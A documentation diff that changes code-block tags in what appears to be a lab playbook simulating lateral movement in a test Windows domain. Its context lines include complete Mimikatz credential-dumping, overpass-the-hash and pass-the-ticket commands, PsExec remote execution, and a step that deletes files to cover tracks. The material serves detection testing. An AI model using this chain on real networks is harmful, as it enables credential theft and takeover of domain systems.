@@ -43,7 +43,7 @@ During our mock reconnaissance attacks, **VictimPC** wasn't only exposed to Jeff
 1. Open an **elevated command prompt** on **VictimPC**.
 1. Navigate to the tools folder where you saved Mimikatz and execute the following command:
 
-    ```dos
+    ```cmd
     mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
     ```
 
@@ -63,7 +63,7 @@ An attacker may not initially know who RonHD is or its value as a target. All th
 
 From **VictimPC**, run the following command:
 
-```dos
+```cmd
 net user ronhd /domain
 ```
 
@@ -77,7 +77,7 @@ Using a common technique called **Overpass-the-Hash**, the harvested NTLM hash i
 
 1. From **VictimPC**, change directory to the folder containing **Mimikatz.exe**. storage location on your filesystem and execute the following command:
 
-    ```dos
+    ```cmd
     mimikatz.exe "privilege::debug" "sekurlsa::pth /user:ronhd /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:contoso.azure" "exit"
     ```
 
@@ -115,13 +115,13 @@ We'll use **PowerSploit** ```Get-NetLocalGroup``` to help answer that.
 
 1. From the *same command prompt, which is running in context of RonHD*, type **exit** to get out of PowerShell if needed. Then, run the following command:
 
-    ```dos
+    ```cmd
     dir \\adminpc\c$
     ```
 
 1. We successfully accessed AdminPC. Let's see what tickets we have. In the same cmd prompt, run the following command:
 
-    ```dos
+    ```cmd
     klist
     ```
 
@@ -155,7 +155,7 @@ Here, we will:
 
 From the command prompt running in the context of *RonHD* on **VictimPC**, traverse to where our common attack-tools are located. Then, run *xcopy* to move those tools to the AdminPC:
 
-```dos
+```cmd
 xcopy mimikatz.exe \\adminpc\c$\temp
 ```
 
@@ -169,7 +169,7 @@ With Mimikatz staged on AdminPC, we'll use PsExec to remotely execute it.
 
 1. Traverse to where PsExec is located and execute the following command:
 
-    ```dos
+    ```cmd
     PsExec.exe \\AdminPC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
     ```
 
@@ -177,7 +177,7 @@ With Mimikatz staged on AdminPC, we'll use PsExec to remotely execute it.
 
 1. We need to copy the tickets back over to VictimPC from AdminPC. Since we're only interested in SamiraA's tickets for this example, execute the following command:
 
-    ```dos
+    ```cmd
     xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
     ```
 
@@ -185,7 +185,7 @@ With Mimikatz staged on AdminPC, we'll use PsExec to remotely execute it.
 
 1. Let's clean up our tracks on AdminPC by deleting our files.
 
-    ```dos
+    ```cmd
     rmdir \\adminpc\c$\temp /s /q
     ```
 
@@ -202,7 +202,7 @@ With the tickets locally on VictimPC, it's finally time to become SamiraA by "Pa
 
 1. From the location of **Mimikatz** on **VictimPC**'s filesystem, open a new **elevated command prompt**, and execute the following command:
 
-    ```dos
+    ```cmd
     mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
     ```
 
@@ -210,7 +210,7 @@ With the tickets locally on VictimPC, it's finally time to become SamiraA by "Pa
 
 1. In the same elevated command prompt, validate that the right tickets are in the command prompt session. Execute the following command:
 
-    ```dos
+    ```cmd
     klist
     ```
 
@@ -223,7 +223,7 @@ With the tickets locally on VictimPC, it's finally time to become SamiraA by "Pa
 
 1. Complete your simulated attack by accessing the domain controller from **VictimPC**. In the command prompt, now running with the tickets of SamirA in memory, execute:
 
-    ```dos
+    ```cmd
     dir \\ContosoDC\c$
     ```
 
